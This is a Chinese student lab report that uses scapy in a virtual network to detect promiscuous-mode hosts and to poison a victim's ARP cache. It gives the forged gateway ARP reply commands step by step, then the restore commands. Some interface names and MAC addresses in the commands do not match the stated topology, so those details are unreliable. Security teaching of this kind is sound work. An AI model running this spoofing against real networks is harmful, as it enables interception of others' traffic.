# 实验四 实验报告

### 网络拓扑

- 攻击者主机
  - 08:00:27:0e:34:8d / eth0
  - 10.0.2.5
- 受害者主机
  - 08:00:27:1d:6c:7e / eth0
  - 172.16.111.100
- 网关
  - 08:00:27:71:81:de / enp0s9
  - 172.16.111.1

## 实验一：检测局域网中的异常终端

```
# 在受害者主机上检查网卡的「混杂模式」是否启用
ip link show eh0
```

<img src="./img/ip beat-kali.png" style="zoom:80%;" />

```
# 在攻击者主机上开启 scapy
sudo scapy
# 在 scapy 的交互式终端输入以下代码回车执行
pkt = promiscping("172.16.111.128")
```

<img src="./img/scapy.png" style="zoom:80%;" />

<img src="./img/scapy1.png" style="zoom:80%;" />

```
# 在攻击者主机上开启 scapy
sudo scapy
```

<img src="./img/scapy2.png" style="zoom:80%;" />

```
# 在 scapy 的交互式终端输入以下代码回车执行
pkt = promiscping("172.16.111.100")
```

<img src="./img/pkt.png"  />

```
# 回到受害者主机上开启网卡的『混杂模式』
# 注意上述输出结果里应该没有出现 PROMISC 字符串
# 手动开启该网卡的「混杂模式」
sudo ip link set eth0 promisc on
# 此时会发现输出结果里多出来了 PROMISC 
ip link show eth
```

<img src="./img/hunza.png" style="zoom:80%;" />

<img src="./img/showeth0.png" style="zoom:80%;" />

```
# 回到攻击者主机上的 scapy 交互式终端继续执行命令
# 观察两次命令的输出结果差异
pkt = promiscping("172.16.111.100")
```

<img src="./img/back'.png" style="zoom:80%;" />

```
# 在受害者主机上
# 手动关闭该网卡的「混杂模式」
sudo ip link set enp0s3 promisc off
```

### 实验二：手工单步“毒化”目标主机的 ARP 缓存

1. 获取当前局域网的网关 MAC 地址

```
# 获取当前局域网的网关 MAC 地址
# 构造一个 ARP 请求
arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="172.16.111.1")

# 查看构造好的 ARP 请求报文详情
arpbroadcast.show()
```

<img src="./img/arp.png" style="zoom:80%;" />

<img src="./img/showarp.png" style="zoom: 200%;" />

```
# 发送这个 ARP 广播请求
recved = srp(arpbroadcast, timeout=2)
```

<img src="./img/sendarp.png" style="zoom: 100%;" />

```
# 网关 MAC 地址如下
gw_mac = recved[0][0][1].hwsrc
```

<img src="./img/mac.png" style="zoom: 100%;" />

```
# 伪造网关的 ARP 响应包
# 准备发送给受害者主机 172.16.111.100
# ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
arpspoofed=Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.100", hwdst="08:00:27:0e:34:8d")
# 发送上述伪造的 ARP 响应数据包到受害者主机
sendp(arpspoofed)
```

<img src="./img/sendattack.png" style="zoom: 120%;" />

回到攻击者主机上的 scapy 交互式终端继续执行命令

```
# 恢复受害者主机的 ARP 缓存记录
## 伪装网关给受害者发送 ARP 响应
restorepkt1 = ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:bb:14:c1", pdst="172.16.111.100",
hwdst="08:00:27:ad:81:3c")
sendp(restorepkt1, count=100, inter=0.2)
```

<img src="./img/begateway.png" style="zoom: 100%;" />

检查受攻击者的ip

<img src="./img/beingat.png" style="zoom: 100%;" />